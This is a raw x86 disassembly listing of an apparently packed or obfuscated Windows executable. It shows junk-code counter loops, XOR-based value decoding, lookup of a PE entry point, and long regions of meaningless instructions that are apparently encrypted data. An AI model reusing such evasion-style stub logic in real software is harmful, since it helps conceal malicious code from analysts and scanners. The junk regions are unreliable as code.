  4061bd:	iret   
  4061be:	outs   dx,BYTE PTR ds:[esi]
  4061bf:	and    BYTE PTR [eax],bl
  4061c1:	stc    
  4061c2:	xchg   ebx,eax
  4061c3:	pushf  
  4061c4:	(bad)  
  4061c6:	shl    BYTE PTR [eax+0x6253f12a],0x5d
  4061cd:	sar    DWORD PTR [esi],1
  4061cf:	inc    eax
  4061d0:	dec    esi
  4061d1:	ins    DWORD PTR es:[edi],dx
  4061d2:	out    0xb3,al
  4061d4:	(bad)  
  4061d5:	push   0x426bad96
  4061da:	out    0x51,eax
  4061dc:	xor    BYTE PTR [esi+esi*4-0x8bcfad7],dl
  4061e3:	out    0xf7,al
  4061e5:	xchg   esi,eax
  4061e6:	add    al,0xc
  4061e8:	inc    edx
  4061e9:	outs   dx,BYTE PTR ds:[esi]
  4061ea:	mov    fs,WORD PTR [ecx+0x2c43aa7b]
  4061f0:	pop    ss
  4061f1:	neg    esi
  4061f3:	dec    esi
  4061f4:	ror    BYTE PTR [edi+0x53],0xde
  4061f8:	and    ebx,DWORD PTR [esi]
  4061fa:	sbb    ah,al
  4061fc:	push   esp
  4061fd:	lods   eax,DWORD PTR ds:[esi]
  4061fe:	out    0xda,eax
  406200:	or     BYTE PTR [edx-0x59],ch
  406203:	retf   0xe5ee
  406206:	ret    0xd8ca
  406209:	mov    al,0x2e
  40620b:	leave  
  40620c:	jmp    0x11b6:0x38ccc785
  406213:	(bad)  
  406214:	cmp    dl,BYTE PTR [ecx-0x6e35a130]
  40621a:	inc    edx
  40621b:	push   ecx
  40621c:	les    edi,FWORD PTR [edx+ebx*8+0x4b]
  406220:	mov    BYTE PTR ds:0x99b4f3bb,dh
  406226:	cmp    eax,0x80fd2b54
  40622b:	jl     0x406219
  40622d:	add    al,0x7c
  40622f:	mov    edx,DWORD PTR [eax+0x1860da49]
  406235:	adc    DWORD PTR [edi],edi
  406237:	mov    esi,0x6e15d74d
  40623c:	pusha  
  40623d:	sbb    eax,0x9cce1b22
  406242:	push   0x70
  406244:	hlt    
  406245:	aad    0x3d
  406247:	bswap  esp
  406249:	imul   edx,DWORD PTR [edx-0x33],0xffffffe9
  40624d:	sub    dh,BYTE PTR [edx+0x4c6c0428]
  406253:	xchg   edx,eax
  406254:	js     0x406257
  406256:	bound  edx,QWORD PTR [esi+ecx*4-0x4a050e7e]
  40625d:	call   0x52c5:0x15ba061f
  406264:	xor    esi,eax
  406266:	and    DWORD PTR ds:0x433823,0x0
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x433823
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x433823,ecx
  406282:	cmp    DWORD PTR ds:0x433823,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x433823,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x433823,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x433823
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x433823,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	add    ah,BYTE PTR [eax+0x3f5498fc]
  406317:	jle    0x406397
  406319:	sub    al,0x7d
  40631b:	jle    0x40639b
  40631d:	pop    ebp
  40631e:	jne    0x40634d
  406320:	loopne 0x40632c
  406322:	ss pop ss
  406324:	add    DWORD PTR [eax+0x7119124a],edx
  40632a:	mov    al,ds:0x9bb5beac
  40632f:	pop    es
  406330:	sbb    DWORD PTR [ecx],ebp
  406332:	sub    eax,0xa71421bd
  406337:	popf   
  406338:	or     dh,BYTE PTR ds:0x64844ebc
  40633e:	test   al,0xa
  406340:	pop    esp
  406341:	(bad)  
  406342:	jmp    0x406307
  406344:	stos   DWORD PTR es:[edi],eax
  406345:	and    esp,eax
  406347:	inc    eax
  406348:	sbb    eax,DWORD PTR [ebx-0x64717e93]
  40634e:	cdq    
  40634f:	xchg   esp,eax
  406350:	sub    al,0x2
  406352:	adc    DWORD PTR [esi-0x7f],eax
  406355:	out    dx,eax
  406356:	jecxz  0x406308
  406358:	push   ebp
  406359:	cmc    
  40635a:	loope  0x406313
  40635c:	addr16 mov eax,ds:0x859
  406360:	daa    
  406361:	(bad)  
  406364:	fldcw  WORD PTR [ebp+0x3f7a481b]
  40636a:	inc    ebx
  40636b:	xor    ebx,DWORD PTR [edx]
  40636d:	xchg   ebp,eax
  40636e:	dec    ebx
  40636f:	xor    dl,BYTE PTR [ebx]
  406371:	inc    edx
  406372:	xor    edi,DWORD PTR [ebx-0x37]
  406375:	or     ch,BYTE PTR [edx+0x634c0fbf]
  40637b:	adc    eax,0x6caa197e
  406380:	shl    BYTE PTR [edx-0x474416b3],0xda
  406387:	popaw  
  406389:	sub    cl,BYTE PTR [ecx+0x5b]
  40638c:	std    
  40638d:	test   BYTE PTR [edi+eax*1-0x77],bh
  406391:	outs   dx,BYTE PTR ds:[esi]
  406392:	bound  edx,QWORD PTR [ebx-0x50]
  406395:	(bad)  
  406399:	outs   dx,DWORD PTR ds:[esi]
  40639a:	sub    eax,DWORD PTR [ebp+0x3a]
  40639d:	xchg   ecx,eax
  40639e:	out    0xe6,eax
  4063a0:	(bad)  
  4063a1:	ret    
  4063a2:	xchg   ebx,eax
  4063a3:	add    BYTE PTR [ebx+0x2bba329c],cl
  4063a9:	sbb    eax,0x8ce9d47
  4063ae:	xlat   BYTE PTR ds:[ebx]
  4063af:	add    eax,DWORD PTR [edi-0x6d]
  4063b2:	fidiv  DWORD PTR [esi]
  4063b4:	mov    dh,0x7b
  4063b6:	mov    dh,0x53
  4063b8:	add    BYTE PTR [ebp-0x334614f],ch
  4063be:	xchg   BYTE PTR [ecx-0x6a],ah
  4063c1:	or     bl,al
  4063c3:	out    0x67,eax
  4063c5:	shl    BYTE PTR [ebp+0x1de266af],cl
  4063cb:	jns    0x406354
  4063cd:	(bad)  
  4063cf:	das    
  4063d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063d1:	cmp    DWORD PTR [esi],ebx
  4063d3:	xor    BYTE PTR [ebx+0x41],dl
  4063d6:	jg     0x4063f7
  4063d8:	ja     0x4063f9
  4063da:	adc    al,0x4
  4063dc:	retf   0xa8e0
  4063df:	js     0x40644d
  4063e1:	jp     0x406409
  4063e3:	lods   eax,DWORD PTR ds:[esi]
  4063e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063e5:	aam    0xb7
  4063e7:	rep stos BYTE PTR es:[edi],al
  4063e9:	mov    dh,0x1d
  4063eb:	sar    DWORD PTR [esi-0x2],1
  4063ee:	add    eax,0xb6d8b2a7
  4063f3:	cmp    dl,bh
  4063f5:	adc    cl,dl
  4063f7:	lea    ebx,[ebp+0xa]
  4063fa:	sbb    eax,0x33dc58a
  4063ff:	or     edi,ebx
  406401:	jnp    0x4063c2
  406403:	in     al,dx
  406404:	(bad)  
  406405:	pop    esi
  406406:	push   eax
  406407:	xchg   BYTE PTR [ecx+0x67d45867],cl
  40640d:	ja     0x4063cb
  40640f:	add    ebx,DWORD PTR [edx+0x7ead50d8]
  406415:	mov    ebx,0x8537ec1c
  40641a:	rcl    BYTE PTR [edx-0x53],1
  40641d:	mov    eax,ds:0x3e49dfef
  406422:	je     0x406430
  406424:	xor    al,0x56
  406426:	or     ah,dh
  406428:	push   esi
  406429:	loopne 0x4063cd
  40642b:	std    
  40642c:	mov    esi,0x6923036a
  406431:	sub    ch,bh
  406433:	mov    edi,gs
  406435:	mov    esp,0x69f2eff2
  40643a:	(bad)
  40643d:	scas   eax,DWORD PTR es:[edi]
  40643e:	pop    esi
  40643f:	jp     0x4063c9
  406441:	inc    esi
  406442:	push   es
  406443:	popf   
  406444:	or     DWORD PTR [edi-0x19a4ed55],eax
  40644a:	(bad)  
  40644b:	fldcw  WORD PTR ds:0x273617af
  406451:	fadd   DWORD PTR [edx]
  406453:	fs push ss
  406455:	and    ecx,DWORD PTR [eax+0x1b58a347]
  40645b:	pop    ebp
  40645c:	scas   al,BYTE PTR es:[edi]
  40645d:	adc    eax,0xeb9fbc03
  406462:	jb     0x406409
  406464:	popa   
  406465:	sbb    eax,0xb719673
  40646a:	pop    ebp
  40646b:	mov    DWORD PTR [ecx],eax
  40646d:	push   esp
  40646e:	xor    BYTE PTR [ebx-0x25],0x8a
  406472:	sub    DWORD PTR [eax-0x3fc00b2e],ebx
  406478:	loopne 0x40645d
  40647a:	adc    ebx,eax
  40647c:	les    esp,FWORD PTR [ebp+0x5258e163]
  406482:	mov    dl,0x40
  406484:	outs   dx,DWORD PTR ds:[esi]
  406485:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406486:	fnstcw WORD PTR [esi+0x61]
  406489:	inc    edi
  40648a:	cmp    ebp,DWORD PTR [esi+ebx*8-0x4d946f54]
  406491:	aas    
  406492:	xchg   esi,eax
  406493:	mov    es,WORD PTR ds:0xa8604f70
  406499:	cmp    BYTE PTR [ebx+0x1931e21d],bl
  40649f:	ins    BYTE PTR es:[edi],dx
  4064a0:	xor    al,0x4f
  4064a2:	aaa    
  4064a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064a4:	adc    ch,BYTE PTR [edx-0x21c9cc27]
  4064aa:	les    ebx,FWORD PTR [edi-0x2e]
  4064ad:	mov    al,ds:0xf4b04c0b
  4064b2:	fisubr WORD PTR [esi+0xa]
  4064b5:	out    dx,eax
  4064b6:	loopne 0x4064bd
  4064b8:	enter  0xb7ed,0xa1
  4064bc:	cmp    DWORD PTR [ecx+0x46c8c59f],0x9fbfe385
  4064c6:	(bad)  
  4064c7:	pavgw  mm5,QWORD PTR [ecx+0x3b]
  4064cb:	loop   0x4064de
  4064cd:	popf   
  4064ce:	push   ss
  4064cf:	call   0x6d28cb7d
  4064d4:	cwde   
  4064d5:	mov    dh,0x3d
  4064d7:	jne    0x406530
  4064d9:	or     al,0x4e
  4064db:	rol    ch,0xb1
  4064de:	jmp    0x4734:0xabe10e54
  4064e5:	in     al,dx
  4064e6:	pop    edx
  4064e7:	xor    BYTE PTR [edi-0x11f5208e],bh
  4064ed:	imul   ecx,DWORD PTR [edx+0x3f],0x2c84e62
  4064f4:	in     eax,dx
  4064f5:	pop    ecx
  4064f6:	fimul  WORD PTR [ebp+0x3f]
  4064f9:	out    0x1f,eax
  4064fb:	test   BYTE PTR [esi-0x7d7969a7],bh
  406501:	pop    esi
  406502:	shl    BYTE PTR [ecx],cl
  406504:	cld    
  406505:	arpl   WORD PTR [edi-0x60],bp
  406508:	shl    BYTE PTR [edi-0x2e2c11b5],cl
  40650e:	jmp    0x7c4d72c4
  406513:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406514:	(bad)  
  406515:	pop    ebp
  406516:	dec    esp
  406517:	mov    ds:0x3c9e4f6d,al
  40651c:	mov    esi,0xc5ab40b3
  406521:	scas   eax,DWORD PTR es:[edi]
  406522:	inc    esp
  406523:	fcom   QWORD PTR [ebp-0x6f]
  406526:	push   ecx
  406527:	neg    edi
  406529:	(bad)  
  40652a:	dec    edi
  40652b:	push   esp
  40652c:	sub    bl,0x10
  40652f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406530:	pop    es
  406531:	xchg   ebp,eax
  406532:	call   0xbd371d3c
  406537:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406538:	adc    DWORD PTR [edx+0x2e],ecx
  40653b:	cmp    al,0xbf
  40653d:	(bad)  
  40653e:	xor    DWORD PTR [eax+0x667a68ae],eax
  406544:	jo     0x406551
  406546:	cli    
  406547:	pop    ds
  406548:	mov    esi,0x86c1e9cb
  40654d:	mov    eax,ds:0x5b0eaf8c
  406552:	fs jbe 0x406567
  406555:	ins    DWORD PTR es:[edi],dx
  406556:	fisub  DWORD PTR [eax+edi*2+0x4f]
  40655a:	test   al,0x43
  40655c:	cdq    
  40655d:	pop    ebx
  40655e:	mov    DWORD PTR ds:[ecx+0x1a],0xd0dd8db2
  406566:	int    0x50
  406568:	jo     0x4064f0
  40656a:	in     eax,dx
  40656b:	mov    eax,DWORD PTR [edx+ecx*2-0x1c166a33]
  406572:	hlt    
  406573:	xchg   edi,eax
  406574:	sub    BYTE PTR [esi-0x75],dl
  406577:	ins    BYTE PTR es:[edi],dx
  406578:	pop    esi
  406579:	into   
  40657a:	inc    ebp
  40657b:	out    dx,eax
  40657c:	pop    ss
  40657d:	mov    WORD PTR [esi+edi*4],gs
  406580:	xchg   ecx,ecx
  406582:	push   cs
  406583:	pop    esi
  406584:	les    esi,FWORD PTR [ecx+0x7ca8f2f1]
  40658a:	not    BYTE PTR [ecx+ebp*4+0x1b]
  40658e:	sub    cl,dh
  406590:	or     edx,0x11b72fb0
  406596:	retf   
  406597:	std    
  406598:	inc    esp
  406599:	sbb    cl,BYTE PTR [ebp-0x4b]
  40659c:	adc    al,0xb1
  40659e:	lea    ebp,[esi+0x3c]
  4065a1:	repnz mov ds:0x73e1165b,al
  4065a7:	jb     0x40657e
  4065a9:	sub    esp,esi
  4065ab:	xchg   ebp,eax
  4065ac:	arpl   WORD PTR [eax-0x58],sp
  4065af:	icebp  
  4065b0:	mov    ebp,0x1d7a6a68
  4065b5:	jno    0x406569
  4065b7:	pop    eax
  4065b8:	adc    esi,esp
  4065ba:	ds sti 
  4065bc:	scas   al,BYTE PTR es:[edi]
  4065bd:	repz push edi
  4065bf:	repnz dec ebx
  4065c1:	cmp    BYTE PTR [edx+0x7dad1200],dl
  4065c7:	enter  0xca35,0x1e
  4065cb:	cwde   
  4065cc:	adc    eax,0x106cd5fc
  4065d1:	into   
  4065d2:	push   eax
  4065d3:	shl    DWORD PTR [ebp-0x4320ad79],1
  4065d9:	std    
  4065da:	dec    esp
  4065db:	mov    WORD PTR [edi],?
  4065dd:	ret    
  4065de:	mov    edx,0x95969913
  4065e3:	inc    ebp
  4065e4:	data16 es repnz hlt 
  4065e8:	xchg   edx,eax
  4065e9:	jmp    0x4065f3
  4065eb:	lock inc edx
  4065ed:	addr16 fs in al,dx
  4065f0:	xchg   ebp,eax
  4065f1:	jmp    0x4e83d4c6
  4065f6:	jp     0x406615
  4065f8:	lea    esp,[esi+0x55c9af99]
  4065fe:	add    dl,BYTE PTR [ecx]
  406600:	jmp    0xaacb5de3
  406605:	shr    BYTE PTR [ebx],cl
  406607:	fs mov cl,0x11
  40660a:	cmp    dh,ah
  40660c:	sbb    eax,0xfc6eeed2
  406611:	ja     0x23cc7aba
  406617:	push   ds
  406618:	std    
  406619:	jmp    FWORD PTR [edi-0x49]
  40661c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40661d:	push   edi
  40661e:	fild   WORD PTR [esi-0x4bd4ef1a]
  406624:	inc    ebx
  406625:	lock cmp BYTE PTR es:[ebx-0x50],cl
  40662a:	jo     0x4065cc
  40662c:	addr16 and cl,cl
  40662f:	fwait
  406630:	sub    eax,0xf2f307ad
  406635:	xor    al,0xd6
  406637:	xor    al,0x4b
  406639:	ins    BYTE PTR es:[edi],dx
  40663a:	nop
  40663b:	cmp    cl,BYTE PTR [eax+0x2b]
  40663e:	pusha  
  40663f:	add    eax,esp
  406641:	popf   
  406642:	jb     0x40665f
  406644:	icebp  
  406645:	int3   
  406646:	stos   BYTE PTR es:[edi],al
  406647:	cmp    BYTE PTR [edx],bh
  406649:	mov    ecx,esp
  40664b:	fadd   st,st(4)
  40664d:	and    BYTE PTR [ebx-0x1],bl
  406650:	shr    cl,1
  406652:	add    eax,DWORD PTR [eax]
  406654:	add    BYTE PTR [eax],al
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x4336fb,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x4337d3,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x4337a7,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x4337e3,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x4337e3
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x4337e3,ecx
  4066d8:	cmp    DWORD PTR ds:0x4337e3,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433903
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x4337e3,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x4337e3
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x4337e3,ecx
  406714:	cmp    DWORD PTR ds:0x4337e3,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x4337d7
  406728:	and    ecx,DWORD PTR ds:0x43370f
  40672e:	mov    DWORD PTR ds:0x4337d7,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43371b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x43382b
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433713,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x43376b,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433707,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433707
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433707,ebx
  40677d:	cmp    DWORD PTR ds:0x433707,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433707,0x23
  406791:	jne    0x4067a7
  406797:	push   0x433933
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x4337ab,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433797,0x4337a7
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x4337d3
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x43376b,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433713,0x43379f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433707,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x4337af
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x4337e3
  40683c:	and    DWORD PTR ds:0x4337a7,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x43382b
  40684d:	or     DWORD PTR ds:0x4337e3,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x43375b,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43381f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x4337ab
  406870:	sub    DWORD PTR ds:0x4337d3,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43370b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433707,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433713,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43370f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x433723,0x43382b
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43379b,0x4337df
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x4337e7,0x433793
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x433753,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x43375b,0x4337ef
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x4337ab,0x43376f
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x43375b,0x43379b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x4336fb
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x4336fb,0x433723
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x4337db
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x4336ff,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x4337ef,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43381b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43381b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43381b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43381b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43381b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433797
  4069db:	adc    ecx,DWORD PTR ds:0x43375f
  4069e1:	mov    DWORD PTR ds:0x433797,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433793,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x433767,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433793,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43370f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43379b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43371b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x4337d3,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
